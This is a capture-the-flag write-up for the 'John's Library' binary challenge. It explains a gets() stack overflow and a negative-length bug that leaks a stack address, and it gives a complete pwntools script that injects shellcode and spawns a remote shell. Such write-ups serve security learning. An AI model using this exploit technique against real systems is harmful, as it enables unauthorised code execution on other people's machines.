# John's Library
Do you like reading books? here we have the best collection ever! you can even save some books for future reading!! enjoy noob!

## Recon
We are presented with the following menu upon connection:
```
Welcome to the jungle library mate! Try to escape!!

r - read from library
a - add element
u - exit
```

There is two bits of functionality that we have access to

### Add book to library
```
 r - read from library
 a - add element
 u - exit
a
Hey mate! Insert how long is the book title:
8
deadbeef
```
With adding a book, we input two values:
* Length of the text
* The text itself

The interesting bit is that the length of each book is stored in a global array located at `0x804a060`. The text is stored in a buffer located on the stack. This address is passed to both the read and add functions as an argument.

### Reading from the library
```
 r - read from library
 a - add element
 u - exit
r
Insert the index of the book you want to read: 0
deadbeef
```

This function takes the index of a book and reads the information stored at that index. This calculation is done by reading the corresponding stored length from `0x804a060 + index`
and adding that length to the beginning of the buffer passed to the function (which is also on the stack).

### Vulnerabilities
There are two bugs in the code.
* The data stored in the buffer is read via a `gets()` call, causing a traditional stack overflow. This is exploited upon exiting the program.
* The length of the book isn't checked for being negative. This allows us to arbitrarily read valvues on the stack. It just so happens that the start of the buffer is pushed on the stack as a parameter to both read and add functions. An example stack is below (addresses are not accurate)

```
+-------------------+
| Pointer to buffer | 0x400000
+-------------------+
| .....             |
+-------------------+
| Buf               | 0x40001b
|                   |
|                   |
+-------------------+
```


### Exploit
The stack is randomized on the remote server. We can't hard code the stack address, as we won't know what it is at execution. We have to leak this address.

By supplying a `-0x1b` length for the first book and then reading that book's index, we can actually read the beginning of the buffer, giving us a static address to jump to for our shellcode.


Exploit will work as follows:
* Create a book with `-28` length (data for the book is irrevelent)
* Read that book via index 0 and retrieve the 4 bytes of the stack
* Add a second book, but this time overflow via `gets()` with our shellcode at the beginning of the buffer and returning to our leaked stack address.
* Exit the program via `u`
* ???
* Profit

### Exploit code

```python
from pwn import *

"""
Both functions are given a pointer to a stack address (named BUFF)
Add function (overflow):
Drops the given length into a global buffer starting at 0x804a060
There is no negative check, so feeding a negative value passes the check
Vulnerable gets() function drops input into BUFF

Read (mem leak):
Takes the previously given length from add and adds that offset in BUFF
Because we can use negative values, we can looks backwards on the stack
to discover the beginning address of BUFF

Exit (trigger):
The overflow from the add isn't exploited until exiting the program
"""


# r = process('./johns-library')
r = remote('library.polictf.it', 80)

# Debugging help with gdb
'''
gdb.attach(r, """
bp 0x8048640
bp 0x8048742
c
""")
'''

log.info("Setting up leak of buffer")
r.sendline('a')
r.sendline(str(-28)) # Set len to subtract to find original buffer location
r.sendline()

log.info("Leaking buffer")
r.sendline('r')
r.sendline('1')
r.recv()
r.recv()
r.recvuntil('read: ')

ret = r.recv()[:4]

log.info('Got buffer: {}'.format(ret[::-1].encode('hex')))

log.info("Preparing shellcode")
shellcode = '\x90' * 900 + asm(shellcraft.sh())

payload = shellcode
payload += cyclic(cyclic_find('aaks') - len(shellcode))
payload += ret
payload += 'a' * (1000 - len(payload))

log.info("Sending shellcode")
r.sendline('a')
r.sendline(payload)

log.info("Exiting problem, causing the exploit")
r.sendline('u')

log.success("And your shell...")
r.interactive()
```
